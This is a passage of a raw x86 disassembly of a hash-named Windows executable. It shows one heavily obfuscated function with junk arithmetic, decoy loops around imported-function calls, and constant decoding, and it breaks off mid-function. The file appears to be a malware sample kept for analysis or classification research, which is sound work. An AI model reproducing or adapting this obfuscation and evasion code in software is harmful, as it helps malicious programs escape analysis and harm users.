
9f99acf9feab62fedc23df6b3b0679cd0380fc56f363c57257756c427004ce92.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xe4
  401009:	push   edi
  40100a:	or     DWORD PTR ds:0x42b018,0x42d018
  401014:	push   0x42e3c7
  401019:	xor    edi,edi
  40101b:	add    DWORD PTR ds:0x42d000,0x42d008
  401025:	inc    edi
  401026:	adc    DWORD PTR ds:0x42901c,0x42c00c
  401030:	push   edi
  401031:	dec    DWORD PTR ds:0x42a018
  401037:	push   edi
  401038:	not    DWORD PTR ds:0x42901c
  40103e:	call   DWORD PTR ds:0x42e90f
  401044:	test   eax,eax
  401046:	je     0x40106f
  40104c:	lea    eax,[ebp-0x50]
  40104f:	push   eax
  401050:	adc    DWORD PTR ds:0x42c018,0x408c
  40105a:	call   DWORD PTR ds:0x42e927
  401060:	mov    DWORD PTR ds:0x42c010,0x701a
  40106a:	jmp    0x4025df
  40106f:	or     DWORD PTR ds:0x42a010,0x42901c
  401079:	push   esi
  40107a:	or     DWORD PTR ds:0x42c018,0x254e
  401084:	mov    esi,DWORD PTR ds:0x42e90b
  40108a:	sub    DWORD PTR ds:0x42c000,0x42b014
  401094:	push   0x8
  401096:	add    DWORD PTR ds:0x42c004,0x1529
  4010a0:	push   0x42e3d7
  4010a5:	sub    DWORD PTR ds:0x42b00c,0x42c010
  4010af:	call   esi
  4010b1:	test   eax,eax
  4010b3:	je     0x4010f0
  4010b9:	sub    DWORD PTR ds:0x429004,0x42c000
  4010c3:	lea    eax,[ebp-0x50]
  4010c6:	sub    DWORD PTR ds:0x429000,0x1be5
  4010d0:	push   eax
  4010d1:	sbb    DWORD PTR ds:0x42b000,0x42d010
  4010db:	call   DWORD PTR ds:0x42e927
  4010e1:	mov    DWORD PTR ds:0x42b000,0x51df
  4010eb:	jmp    0x4025de
  4010f0:	push   ebx
  4010f1:	mov    ebx,DWORD PTR ds:0x429028
  4010f7:	or     ebx,DWORD PTR ds:0x429008
  4010fd:	mov    DWORD PTR ds:0x429028,ebx
  401103:	mov    ebx,DWORD PTR ds:0x42e907
  401109:	add    DWORD PTR ds:0x429024,0x4675
  401113:	push   0x42e3e7
  401118:	or     DWORD PTR ds:0x42c008,0x42c018
  401122:	push   edi
  401123:	adc    DWORD PTR ds:0x42c014,0x42b014
  40112d:	push   edi
  40112e:	call   ebx
  401130:	and    DWORD PTR ds:0x429020,0x61d3
  40113a:	test   eax,eax
  40113c:	jne    0x40121c
  401142:	sbb    DWORD PTR ds:0x42c004,0x42b004
  40114c:	push   0xc
  40114e:	mov    DWORD PTR ds:0x42d004,0x2d3b
  401158:	push   0x42e40b
  40115d:	call   esi
  40115f:	inc    DWORD PTR ds:0x42c008
  401165:	test   eax,eax
  401167:	mov    DWORD PTR ds:0x42b010,0x1593
  401171:	jne    0x40121c
  401177:	sub    DWORD PTR ds:0x42d000,0x17f0
  401181:	push   0x7
  401183:	add    DWORD PTR ds:0x429024,0x2885
  40118d:	push   0x42e41f
  401192:	call   esi
  401194:	and    DWORD PTR ds:0x42d014,0x42c000
  40119e:	test   eax,eax
  4011a0:	mov    DWORD PTR ds:0x42c014,0x720
  4011aa:	jne    0x40121c
  4011b0:	or     DWORD PTR ds:0x42b004,0x42b01c
  4011ba:	push   0x8
  4011bc:	push   0x42e42f
  4011c1:	sbb    DWORD PTR ds:0x42d014,0x5687
  4011cb:	call   esi
  4011cd:	xor    DWORD PTR ds:0x429014,0x42b018
  4011d7:	test   eax,eax
  4011d9:	mov    DWORD PTR ds:0x42d008,0x6461
  4011e3:	jne    0x40121c
  4011e9:	mov    DWORD PTR ds:0x42a014,0x128
  4011f3:	push   0x42e43f
  4011f8:	push   edi
  4011f9:	push   edi
  4011fa:	adc    DWORD PTR ds:0x429020,0x42a000
  401204:	call   DWORD PTR ds:0x42e90f
  40120a:	test   eax,eax
  40120c:	mov    DWORD PTR ds:0x42a01c,0x679f
  401216:	je     0x401249
  40121c:	lea    eax,[ebp-0x50]
  40121f:	sub    DWORD PTR ds:0x42c004,0x42a000
  401229:	push   eax
  40122a:	adc    DWORD PTR ds:0x429024,0xd32
  401234:	call   DWORD PTR ds:0x42e927
  40123a:	mov    DWORD PTR ds:0x42d008,0x45e0
  401244:	jmp    0x4025dd
  401249:	sub    DWORD PTR ds:0x429004,0x429014
  401253:	push   0x42e44f
  401258:	push   edi
  401259:	and    DWORD PTR ds:0x42b00c,0x7ff1
  401263:	push   edi
  401264:	or     DWORD PTR ds:0x42d014,0x42c01c
  40126e:	call   ebx
  401270:	test   eax,eax
  401272:	mov    DWORD PTR ds:0x429028,0x42c
  40127c:	je     0x401766
  401282:	xor    DWORD PTR ds:0x42b01c,0x42a010
  40128c:	push   0xc
  40128e:	xor    DWORD PTR ds:0x42d00c,0x685
  401298:	push   0x42e473
  40129d:	and    DWORD PTR ds:0x42a01c,0x363a
  4012a7:	call   esi
  4012a9:	test   eax,eax
  4012ab:	mov    DWORD PTR ds:0x42b014,0x15a6
  4012b5:	jne    0x40175f
  4012bb:	mov    DWORD PTR ds:0x42b01c,0x5b0e
  4012c5:	push   0x7
  4012c7:	push   0x42e487
  4012cc:	call   esi
  4012ce:	test   eax,eax
  4012d0:	jne    0x40175f
  4012d6:	push   0x8
  4012d8:	push   0x42e497
  4012dd:	call   esi
  4012df:	or     DWORD PTR ds:0x42c018,0x5fc7
  4012e9:	test   eax,eax
  4012eb:	mov    DWORD PTR ds:0x42b01c,0x6bd8
  4012f5:	jne    0x40175f
  4012fb:	add    DWORD PTR ds:0x429000,0x429014
  401305:	push   0x42e4a7
  40130a:	push   edi
  40130b:	push   edi
  40130c:	xor    DWORD PTR ds:0x42d014,0x5ea1
  401316:	call   DWORD PTR ds:0x42e90f
  40131c:	sub    DWORD PTR ds:0x42901c,0x42c008
  401326:	test   eax,eax
  401328:	mov    DWORD PTR ds:0x42a004,0x3a7d
  401332:	jne    0x40175f
  401338:	push   0x42e4b7
  40133d:	and    DWORD PTR ds:0x42a004,0x429004
  401347:	push   edi
  401348:	or     DWORD PTR ds:0x42a01c,0x6055
  401352:	push   edi
  401353:	sub    DWORD PTR ds:0x429014,0x42b00c
  40135d:	call   ebx
  40135f:	xor    DWORD PTR ds:0x42b008,0x42a018
  401369:	test   eax,eax
  40136b:	mov    DWORD PTR ds:0x429014,0x3a80
  401375:	jne    0x40175f
  40137b:	or     DWORD PTR ds:0x42b00c,0x42b010
  401385:	push   0xc
  401387:	push   0x42e4db
  40138c:	call   esi
  40138e:	test   eax,eax
  401390:	jne    0x40175f
  401396:	mov    DWORD PTR ds:0x42900c,0x5e8c
  4013a0:	push   0x7
  4013a2:	push   0x42e4ef
  4013a7:	and    DWORD PTR ds:0x42b010,0x4122
  4013b1:	call   esi
  4013b3:	test   eax,eax
  4013b5:	mov    DWORD PTR ds:0x42a018,0x79ff
  4013bf:	jne    0x40175f
  4013c5:	push   0x8
  4013c7:	push   0x42e4ff
  4013cc:	call   esi
  4013ce:	test   eax,eax
  4013d0:	jne    0x40175f
  4013d6:	or     DWORD PTR ds:0x42a00c,0x42b01c
  4013e0:	push   0x42e50f
  4013e5:	sbb    DWORD PTR ds:0x42d004,0x5fa0
  4013ef:	push   edi
  4013f0:	and    DWORD PTR ds:0x42900c,0x42d00c
  4013fa:	push   edi
  4013fb:	add    DWORD PTR ds:0x42c010,0x54c5
  401405:	call   DWORD PTR ds:0x42e90f
  40140b:	mov    DWORD PTR ds:0x42b010,0x4d18
  401415:	test   eax,eax
  401417:	mov    DWORD PTR ds:0x42b018,0x69c2
  401421:	jne    0x40175f
  401427:	or     DWORD PTR ds:0x42c004,0x44f8
  401431:	push   0x42e51f
  401436:	add    DWORD PTR ds:0x42c004,0x42b01c
  401440:	push   edi
  401441:	adc    DWORD PTR ds:0x429004,0x4c2b
  40144b:	push   edi
  40144c:	call   ebx
  40144e:	test   eax,eax
  401450:	mov    DWORD PTR ds:0x42a008,0x516b
  40145a:	jne    0x40175f
  401460:	add    DWORD PTR ds:0x42d014,0x429018
  40146a:	push   0xc
  40146c:	push   0x42e543
  401471:	mov    DWORD PTR ds:0x42a004,0x58e8
  40147b:	call   esi
  40147d:	sbb    DWORD PTR ds:0x429028,0x2f15
  401487:	test   eax,eax
  401489:	jne    0x40175f
  40148f:	adc    DWORD PTR ds:0x42b000,0x4b6d
  401499:	push   0x7
  40149b:	sbb    DWORD PTR ds:0x42c014,0x42d004
  4014a5:	push   0x42e557
  4014aa:	or     DWORD PTR ds:0x42d008,0x1d0d
  4014b4:	call   esi
  4014b6:	xor    DWORD PTR ds:0x42c018,0xe1e
  4014c0:	test   eax,eax
  4014c2:	mov    DWORD PTR ds:0x42c010,0x6fc5
  4014cc:	jne    0x40175f
  4014d2:	push   0x8
  4014d4:	push   0x42e567
  4014d9:	add    DWORD PTR ds:0x42d000,0x42d018
  4014e3:	call   esi
  4014e5:	test   eax,eax
  4014e7:	jne    0x40175f
  4014ed:	push   0x42e577
  4014f2:	push   edi
  4014f3:	or     DWORD PTR ds:0x42d01c,0x429028
  4014fd:	push   edi
  4014fe:	call   DWORD PTR ds:0x42e90f
  401504:	test   eax,eax
  401506:	mov    DWORD PTR ds:0x42b018,0xe81
  401510:	jne    0x40175f
  401516:	or     DWORD PTR ds:0x42c00c,0x42b014
  401520:	push   0x42e587
  401525:	sub    DWORD PTR ds:0x42c004,0x429028
  40152f:	push   edi
  401530:	xor    DWORD PTR ds:0x42d010,0x42901c
  40153a:	push   edi
  40153b:	and    DWORD PTR ds:0x42d014,0x50c
  401545:	call   ebx
  401547:	test   eax,eax
  401549:	mov    DWORD PTR ds:0x42c008,0x6727
  401553:	jne    0x40175f
  401559:	push   0xc
  40155b:	adc    DWORD PTR ds:0x42a00c,0x1435
  401565:	push   0x42e5ab
  40156a:	mov    DWORD PTR ds:0x42c00c,0x3eef
  401574:	call   esi
  401576:	xor    DWORD PTR ds:0x42b014,0x10aa
  401580:	test   eax,eax
  401582:	mov    DWORD PTR ds:0x42a014,0x7a40
  40158c:	jne    0x40175f
  401592:	push   0x7
  401594:	adc    DWORD PTR ds:0x42b008,0x42a010
  40159e:	push   0x42e5bf
  4015a3:	or     DWORD PTR ds:0x42d004,0x42c014
  4015ad:	call   esi
  4015af:	add    DWORD PTR ds:0x42b008,0x42b014
  4015b9:	test   eax,eax
  4015bb:	mov    DWORD PTR ds:0x42c000,0x2197
  4015c5:	jne    0x40175f
  4015cb:	sub    DWORD PTR ds:0x42a004,0x42b008
  4015d5:	push   0x8
  4015d7:	sbb    DWORD PTR ds:0x42a000,0x42d01c
  4015e1:	push   0x42e5cf
  4015e6:	adc    DWORD PTR ds:0x42b00c,0x429010
  4015f0:	call   esi
  4015f2:	mov    DWORD PTR ds:0x42c004,0x76c3
  4015fc:	test   eax,eax
  4015fe:	mov    DWORD PTR ds:0x42901c,0x7b99
  401608:	jne    0x40175f
  40160e:	adc    DWORD PTR ds:0x42c008,0x42901c
  401618:	push   0x42e5df
  40161d:	push   edi
  40161e:	push   edi
  40161f:	call   DWORD PTR ds:0x42e90f
  401625:	adc    DWORD PTR ds:0x42a004,0x43e7
  40162f:	test   eax,eax
  401631:	jne    0x40175f
  401637:	sbb    DWORD PTR ds:0x42b00c,0x42c008
  401641:	push   0x42e5ef
  401646:	or     DWORD PTR ds:0x42d00c,0x67f5
  401650:	push   edi
  401651:	mov    DWORD PTR ds:0x42c008,0x11d2
  40165b:	push   edi
  40165c:	add    DWORD PTR ds:0x429024,0x35c0
  401666:	call   ebx
  401668:	adc    DWORD PTR ds:0x42a01c,0x475f
  401672:	test   eax,eax
  401674:	mov    DWORD PTR ds:0x42c010,0x9db
  40167e:	jne    0x40175f
  401684:	add    DWORD PTR ds:0x42b01c,0x42c010
  40168e:	push   0xc
  401690:	push   0x42e613
  401695:	call   esi
  401697:	test   eax,eax
  401699:	jne    0x40175f
  40169f:	push   0x7
  4016a1:	sub    DWORD PTR ds:0x42a010,0x42b00c
  4016ab:	push   0x42e627
  4016b0:	xor    DWORD PTR ds:0x42a000,0x46f8
  4016ba:	call   esi
  4016bc:	sub    DWORD PTR ds:0x429028,0x1e37
  4016c6:	test   eax,eax
  4016c8:	mov    DWORD PTR ds:0x429008,0x34bb
  4016d2:	jne    0x40175f
  4016d8:	adc    DWORD PTR ds:0x42d01c,0x42d008
  4016e2:	push   0x8
  4016e4:	neg    DWORD PTR ds:0x42d004
  4016ea:	push   0x42e637
  4016ef:	call   esi
  4016f1:	xor    DWORD PTR ds:0x429020,0x5303
  4016fb:	test   eax,eax
  4016fd:	jne    0x40175f
  401703:	sub    DWORD PTR ds:0x429014,0x42c01c
  40170d:	push   0x42e647
  401712:	not    DWORD PTR ds:0x429000
  401718:	push   edi
  401719:	or     DWORD PTR ds:0x42c01c,0x7461
  401723:	push   edi
  401724:	call   DWORD PTR ds:0x42e90f
  40172a:	test   eax,eax
  40172c:	mov    DWORD PTR ds:0x42901c,0x5bee
  401736:	jne    0x40175f
  40173c:	sbb    DWORD PTR ds:0x42c008,0x1a2b
  401746:	push   0x42e657
  40174b:	push   edi
  40174c:	neg    DWORD PTR ds:0x42b010
  401752:	push   edi
  401753:	sbb    DWORD PTR ds:0x42c000,0x42b008
  40175d:	call   ebx
  40175f:	xor    eax,eax
  401761:	jmp    0x4025dd
  401766:	mov    esi,DWORD PTR ds:0x41cde0
  40176c:	mov    eax,ds:0x41ce2c
  401771:	sub    eax,esi
  401773:	xor    esi,DWORD PTR [esi+eax*1]
  401776:	mov    DWORD PTR [ebp-0x10],0x0
  40177d:	mov    eax,DWORD PTR [ebp-0x34]
  401780:	mov    DWORD PTR [ebp-0x34],eax
  401783:	mov    ecx,0xf89c8585
  401788:	neg    edi
  40178a:	mov    DWORD PTR [ebp-0x8],ecx
  40178d:	mov    edx,DWORD PTR ds:0x42d018
  401793:	sub    edx,DWORD PTR ds:0x42b000
  401799:	mov    DWORD PTR ds:0x42d018,edx
  40179f:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4017a6:	xor    esi,esi
  4017a8:	add    esi,DWORD PTR ds:0x41cd71
  4017ae:	xor    edx,edx
  4017b0:	add    edx,DWORD PTR ds:0x41cdf8
  4017b6:	sub    esi,edx
  4017b8:	and    esi,DWORD PTR [esi+edx*1]
  4017bb:	lea    eax,[ebp-0x3c]
  4017be:	and    DWORD PTR ds:0x42c000,0x550f
  4017c8:	mov    DWORD PTR [ebp-0x30],eax
  4017cb:	mov    DWORD PTR ds:0x42a010,0x1f
  4017d5:	cmp    DWORD PTR ds:0x42a010,0x0
  4017dc:	je     0x40182a
  4017e2:	cmp    DWORD PTR ds:0x42a010,0x2a
  4017e9:	jne    0x401805
  4017ef:	push   DWORD PTR [ebp-0x10]
  4017f2:	push   0x7c9b
  4017f7:	push   0x511d
  4017fc:	push   DWORD PTR [ebp-0x1c]
  4017ff:	call   DWORD PTR ds:0x42e8e7
  401805:	mov    edx,DWORD PTR ds:0x42a010
  40180b:	dec    edx
  40180c:	mov    DWORD PTR ds:0x42a010,edx
  401812:	jmp    0x4017d5
  401817:	mov    edx,DWORD PTR ds:0x41cdd8
  40181d:	xor    edi,edi
  40181f:	xor    edi,DWORD PTR ds:0x41ce10
  401825:	sub    edi,edx
  401827:	add    edx,DWORD PTR [edx+edi*1]
  40182a:	lea    eax,[ebp-0x44]
  40182d:	mov    DWORD PTR [ebp-0x18],eax
  401830:	mov    edi,DWORD PTR ds:0x41ce2c
  401836:	mov    edx,DWORD PTR ds:0x41cd89
  40183c:	sub    edx,edi
  40183e:	imul   edi,DWORD PTR [edi+edx*1]
  401842:	mov    eax,ds:0x42e2b7
  401847:	movzx  edx,BYTE PTR ds:0x42a01c
  40184e:	and    edx,DWORD PTR ds:0x42c010
  401854:	mov    DWORD PTR ds:0x42a01c,edx
  40185a:	mov    eax,DWORD PTR [eax+0x1c8]
  401860:	mov    eax,DWORD PTR [eax]
  401862:	xor    edi,edi
  401864:	mov    edx,DWORD PTR [ebp-0x18]
  401867:	mov    esi,DWORD PTR ds:0x429028
  40186d:	and    DWORD PTR ds:0x42d004,esi
  401873:	mov    esi,0x751089b
  401878:	or     DWORD PTR ds:0x42900c,ebx
  40187e:	xor    eax,esi
  401880:	and    DWORD PTR ds:0x42b010,0x0
  40188a:	mov    edi,DWORD PTR ds:0x42b010
  401890:	inc    edi
  401891:	mov    DWORD PTR ds:0x42b010,edi
  401897:	cmp    DWORD PTR ds:0x42b010,0x25
  40189e:	jne    0x4018ba
  4018a4:	push   DWORD PTR [ebp-0x1c]
  4018a7:	push   DWORD PTR [ebp-0x10]
  4018aa:	push   0x42e000
  4018af:	push   0x400000
  4018b4:	call   DWORD PTR ds:0x42e8eb
  4018ba:	cmp    DWORD PTR ds:0x42b010,0x17
  4018c1:	jb     0x40188a
  4018c7:	mov    edi,0x3272e2
  4018cc:	add    eax,edi
  4018ce:	mov    DWORD PTR ds:0x42a010,0x30bc
  4018d8:	mov    DWORD PTR [edx],eax
  4018da:	mov    DWORD PTR ds:0x42c014,0x6382
  4018e4:	mov    eax,ds:0x42e753
  4018e9:	mov    DWORD PTR ds:0x429028,0x5397
  4018f3:	cmp    eax,0x312bc9f6
  4018f8:	jne    0x401986
  4018fe:	mov    eax,DWORD PTR [ebp-0x8]
  401901:	sub    DWORD PTR ds:0x42c004,edx
  401907:	mov    edx,DWORD PTR ds:0x42e2b7
  40190d:	mov    ebx,DWORD PTR ds:0x41ce24
  401913:	mov    ebx,DWORD PTR [ebx]
  401915:	adc    DWORD PTR ds:0x42a018,ebx
  40191b:	mov    edx,DWORD PTR [edx+0x198]
  401921:	xor    ebx,0x3fd0
  401927:	xor    eax,esi
  401929:	sbb    DWORD PTR ds:0x429010,0x42901c
  401933:	add    eax,edi
  401935:	or     DWORD PTR ds:0x42900c,edx
  40193b:	mov    DWORD PTR [edx],eax
  40193d:	mov    eax,DWORD PTR [ebp-0x8]
  401940:	and    DWORD PTR ds:0x42a014,0x0
  40194a:	mov    ebx,DWORD PTR ds:0x42a014
  401950:	inc    ebx
  401951:	mov    DWORD PTR ds:0x42a014,ebx
  401957:	cmp    DWORD PTR ds:0x42a014,0x20
  40195e:	jne    0x40196a
  401964:	call   DWORD PTR ds:0x42e8ef
  40196a:	cmp    DWORD PTR ds:0x42a014,0x1c
  401971:	jb     0x40194a
  401977:	xor    eax,esi
  401979:	add    eax,edi
  40197b:	add    DWORD PTR ds:0x42d00c,ebx
  401981:	mov    ds:0x42e753,eax
  401986:	mov    eax,ds:0x42e2b7
  40198b:	and    DWORD PTR ds:0x42c014,0x7897
  401995:	mov    eax,DWORD PTR [eax+0x18c]
  40199b:	or     DWORD PTR ds:0x42d004,0x42d014
  4019a5:	mov    eax,DWORD PTR [eax]
  4019a7:	sbb    ebx,0x2d4c
  4019ad:	mov    DWORD PTR [ebp-0x7c],eax
  4019b0:	sbb    DWORD PTR ds:0x42c008,edx
  4019b6:	mov    ebx,0xf89c85b9
  4019bb:	neg    eax
  4019bd:	mov    DWORD PTR [ebp-0x10],ebx
  4019c0:	and    DWORD PTR ds:0x42c000,0x0
  4019ca:	mov    eax,ds:0x42c000
  4019cf:	inc    eax
  4019d0:	mov    ds:0x42c000,eax
  4019d5:	cmp    DWORD PTR ds:0x42c000,0xa
  4019dc:	jne    0x4019e8
  4019e2:	call   DWORD PTR ds:0x42e8f3
  4019e8:	cmp    DWORD PTR ds:0x42c000,0x9
  4019ef:	jne    0x401a00
  4019f5:	mov    eax,ds:0x42c000
  4019fa:	inc    eax
  4019fb:	mov    ds:0x42c000,eax
  401a00:	cmp    DWORD PTR ds:0x42c000,0x15
  401a07:	jb     0x4019ca
  401a0d:	movzx  eax,WORD PTR ds:0x42c00c
  401a14:	and    eax,DWORD PTR ds:0x42c018
  401a1a:	mov    ds:0x42c00c,eax
  401a1f:	mov    DWORD PTR [ebp-0x10],ebx
  401a22:	sub    DWORD PTR ds:0x42b004,ecx
  401a28:	mov    DWORD PTR [ebp-0x10],ebx
  401a2b:	mov    DWORD PTR [ebp-0x18],ecx
  401a2e:	mov    DWORD PTR [ebp-0x10],ebx
  401a31:	dec    DWORD PTR ds:0x42c014
  401a37:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401a3e:	mov    eax,ds:0x42a010
  401a43:	adc    DWORD PTR ds:0x42b00c,eax
  401a49:	mov    eax,DWORD PTR [ebp-0x8]
  401a4c:	add    DWORD PTR ds:0x42a004,0x42901c
  401a56:	xor    eax,esi
  401a58:	add    eax,edi
  401a5a:	mov    DWORD PTR ds:0x42d00c,0x4361
  401a64:	jmp    0x401b08
  401a69:	and    eax,ecx
  401a6b:	mov    eax,DWORD PTR [ebp-0xc]
  401a6e:	mov    ecx,DWORD PTR [ebp-0x1c]
  401a71:	sbb    DWORD PTR ds:0x42d01c,0x38e1
  401a7b:	xor    eax,esi
  401a7d:	or     DWORD PTR ds:0x42b008,0x32de
  401a87:	lea    eax,[eax+ecx*1+0x3272e2]
  401a8e:	or     DWORD PTR ds:0x42900c,0x42c014
  401a98:	push   eax
  401a99:	mov    eax,DWORD PTR [ebp-0x18]
  401a9c:	mov    DWORD PTR ds:0x42b000,0x3f7a
  401aa6:	xor    eax,esi
  401aa8:	adc    DWORD PTR ds:0x42a000,0x429018
  401ab2:	lea    eax,[ebp+eax*1+0x3272ea]
  401ab9:	or     DWORD PTR ds:0x429000,0x42d01c
  401ac3:	push   eax
  401ac4:	sbb    eax,DWORD PTR ds:0x429000
  401aca:	mov    eax,ds:0x42e2b7
  401acf:	push   DWORD PTR [eax+0x1bc]
  401ad5:	and    DWORD PTR ds:0x42d014,0x65ae
  401adf:	call   0x4025f2
  401ae4:	mov    eax,DWORD PTR [ebp-0xc]
  401ae7:	or     edx,0x44
  401aed:	mov    ecx,DWORD PTR [ebp-0x1c]
  401af0:	neg    edx
  401af2:	xor    eax,esi
  401af4:	movzx  edx,BYTE PTR ds:0x42d000
  401afb:	add    DWORD PTR ds:0x429008,edx
  401b01:	lea    eax,[ecx+eax*1+0x3272e2]
  401b08:	mov    ecx,DWORD PTR [ebp-0xc]
  401b0b:	sbb    DWORD PTR ds:0x42900c,0x42c010
  401b15:	mov    edx,DWORD PTR [ebp-0xc]
  401b18:	sbb    DWORD PTR ds:0x42c00c,0x3f25
  401b22:	xor    edx,esi
  401b24:	xor    DWORD PTR ds:0x42901c,0x360b
  401b2e:	xor    ecx,esi
  401b30:	add    ecx,edx
  401b32:	mov    edx,DWORD PTR [ebp-0xc]
  401b35:	xor    edx,esi
  401b37:	lea    ecx,[ecx+edx*1+0x9758a6]
  401b3e:	mov    DWORD PTR ds:0x429010,0x1f54
  401b48:	mov    DWORD PTR [ebp-0x1c],eax
  401b4b:	cmp    eax,ecx
  401b4d:	jbe    0x401a69
  401b53:	mov    eax,ds:0x429020
  401b58:	adc    DWORD PTR ds:0x42901c,eax
  401b5e:	mov    eax,DWORD PTR [ebp+0xc]
  401b61:	mov    ecx,DWORD PTR ds:0x41cd6d
  401b67:	mov    ecx,DWORD PTR [ecx]
  401b69:	or     DWORD PTR ds:0x429028,ecx
  401b6f:	mov    ds:0x42e13b,eax
  401b74:	mov    ecx,DWORD PTR ds:0x429000
  401b7a:	or     DWORD PTR ds:0x42c008,ecx
  401b80:	mov    eax,DWORD PTR [ebp+0x10]
  401b83:	and    DWORD PTR ds:0x42b01c,0x0
  401b8d:	jmp    0x401b9f
  401b92:	mov    ecx,DWORD PTR ds:0x42b01c
  401b98:	inc    ecx
  401b99:	mov    DWORD PTR ds:0x42b01c,ecx
  401b9f:	cmp    DWORD PTR ds:0x42b01c,0x11
  401ba6:	jae    0x401bd3
  401bac:	cmp    DWORD PTR ds:0x42b01c,0x16
  401bb3:	jne    0x401bc4
  401bb9:	push   0x42e0f6
  401bbe:	call   DWORD PTR ds:0x42e8f7
  401bc4:	jmp    0x401b92
  401bc9:	mov    DWORD PTR ds:0x42a018,0x900
  401bd3:	mov    ds:0x42e38f,eax
  401bd8:	adc    DWORD PTR ds:0x42d008,0x597
  401be2:	mov    eax,ds:0x42e13b
  401be7:	mov    DWORD PTR ds:0x42901c,0x19
  401bf1:	cmp    DWORD PTR ds:0x42901c,0x0
  401bf8:	je     0x401c2a
  401bfe:	cmp    DWORD PTR ds:0x42901c,0x23
  401c05:	jne    0x401c16
  401c0b:	push   0x42e075
  401c10:	call   DWORD PTR ds:0x42e8fb
  401c16:	mov    ecx,DWORD PTR ds:0x42901c
  401c1c:	dec    ecx
  401c1d:	mov    DWORD PTR ds:0x42901c,ecx
  401c23:	jmp    0x401bf1
  401c28:	neg    ecx
  401c2a:	mov    ecx,DWORD PTR [ebp-0x30]
  401c2d:	sub    eax,edi
  401c2f:	xor    eax,esi
  401c31:	mov    DWORD PTR [ecx],eax
  401c33:	mov    eax,DWORD PTR [ebp-0x34]
  401c36:	mov    DWORD PTR ds:0x42c014,0x2861
  401c40:	cmp    eax,0xf89c8585
  401c45:	jne    0x401f18
  401c4b:	lea    eax,[ebp-0x48]
  401c4e:	mov    DWORD PTR [ebp-0x9c],eax
  401c54:	lea    eax,[ebp+0x4]
  401c57:	or     DWORD PTR ds:0x42d000,0x2377
  401c61:	mov    DWORD PTR [ebp-0x48],eax
  401c64:	xor    DWORD PTR ds:0x42a018,ecx
  401c6a:	mov    eax,DWORD PTR [ebp-0x48]
  401c6d:	test   eax,eax
  401c6f:	mov    DWORD PTR ds:0x42c00c,0x1657
  401c79:	je     0x4025c2
  401c7f:	mov    eax,DWORD PTR [ebp-0x24]
  401c82:	mov    eax,DWORD PTR [ebp-0xc]
  401c85:	sbb    eax,ecx
  401c87:	mov    eax,DWORD PTR [ebp-0x8]
  401c8a:	or     ecx,DWORD PTR ds:0x42c018
  401c90:	mov    DWORD PTR [ebp+0xc],eax
  401c93:	xor    DWORD PTR ds:0x42a014,edi
  401c99:	mov    eax,eax
  401c9b:	sub    DWORD PTR ds:0x42c000,0x352b
  401ca5:	mov    eax,ds:0x42e2b7
  401caa:	mov    DWORD PTR ds:0x42b014,0x12
  401cb4:	cmp    DWORD PTR ds:0x42b014,0x0
  401cbb:	je     0x401d04
  401cc1:	cmp    DWORD PTR ds:0x42b014,0x7
  401cc8:	jne    0x401cd4
  401cce:	call   DWORD PTR ds:0x42e8ff
  401cd4:	cmp    DWORD PTR ds:0x42b014,0x8
  401cdb:	jne    0x401cf0
  401ce1:	xor    ecx,ecx
  401ce3:	add    ecx,DWORD PTR ds:0x42b014
  401ce9:	dec    ecx
  401cea:	mov    DWORD PTR ds:0x42b014,ecx
  401cf0:	xor    ecx,ecx
  401cf2:	xor    ecx,DWORD PTR ds:0x42b014
  401cf8:	dec    ecx
  401cf9:	mov    DWORD PTR ds:0x42b014,ecx
  401cff:	jmp    0x401cb4
  401d04:	mov    eax,DWORD PTR [eax+0x1c8]
  401d0a:	mov    eax,DWORD PTR [eax]
  401d0c:	mov    DWORD PTR ds:0x429004,0x1d
  401d16:	cmp    DWORD PTR ds:0x429004,0x0
  401d1d:	je     0x401d6d
  401d23:	cmp    DWORD PTR ds:0x429004,0x4
  401d2a:	jne    0x401d41
  401d30:	push   DWORD PTR [ebp-0x28]
  401d33:	push   0x42d000
  401d38:	push   DWORD PTR [ebp-0xc]
  401d3b:	call   DWORD PTR ds:0x42e903
  401d41:	cmp    DWORD PTR ds:0x429004,0x5
  401d48:	jne    0x401d5b
  401d4e:	mov    ecx,DWORD PTR ds:0x429004
  401d54:	dec    ecx
  401d55:	mov    DWORD PTR ds:0x429004,ecx
  401d5b:	mov    ecx,DWORD PTR ds:0x429004
  401d61:	dec    ecx
  401d62:	mov    DWORD PTR ds:0x429004,ecx
  401d68:	jmp    0x401d16
  401d6d:	cdq    
  401d6e:	inc    ecx
  401d6f:	mov    ebx,eax
  401d71:	mov    ecx,DWORD PTR ds:0x42b008
  401d77:	adc    ecx,DWORD PTR ds:0x42b000
  401d7d:	mov    DWORD PTR ds:0x42b008,ecx
  401d83:	mov    eax,0xfabdbee7
  401d88:	and    DWORD PTR ds:0x429014,edi
  401d8e:	add    ebx,eax
  401d90:	mov    DWORD PTR ds:0x42c004,0x916
  401d9a:	adc    edx,0xffffffff
  401d9d:	and    DWORD PTR [ebp-0x10],0x0
  401da1:	or     DWORD PTR ds:0x42b018,0x42d014
  401dab:	xor    edx,0x0
  401dae:	mov    DWORD PTR [ebp-0x6c],edx
  401db1:	adc    DWORD PTR ds:0x42d008,ebx
  401db7:	mov    edx,DWORD PTR [ebp+0xc]
  401dba:	sbb    DWORD PTR ds:0x429004,edi
  401dc0:	mov    DWORD PTR [ebp-0x14],edx
  401dc3:	mov    ecx,0x8a29a12d
  401dc8:	add    edx,0x36ec
  401dce:	xor    ebx,ecx
  401dd0:	add    DWORD PTR [ebp-0x14],eax
  401dd3:	mov    DWORD PTR ds:0x42901c,ebx
  401dd9:	mov    edx,DWORD PTR [ebp-0x14]
  401ddc:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401de0:	xor    edx,ecx
  401de2:	mov    DWORD PTR [ebp-0x5c],edx
  401de5:	or     DWORD PTR ds:0x42a00c,edi
  401deb:	mov    edx,DWORD PTR [ebp-0x10]
  401dee:	xor    DWORD PTR ds:0x42d00c,0x42c018
  401df8:	xor    edx,0x0
  401dfb:	mov    DWORD PTR [ebp-0x58],edx
  401dfe:	mov    DWORD PTR ds:0x42900c,0x40f4
  401e08:	cmp    DWORD PTR [ebp-0x5c],ebx
  401e0b:	mov    DWORD PTR ds:0x42a004,0x5ee8
  401e15:	jne    0x401e3b
  401e1b:	mov    DWORD PTR ds:0x42b004,0x3032
  401e25:	mov    edx,DWORD PTR [ebp-0x6c]
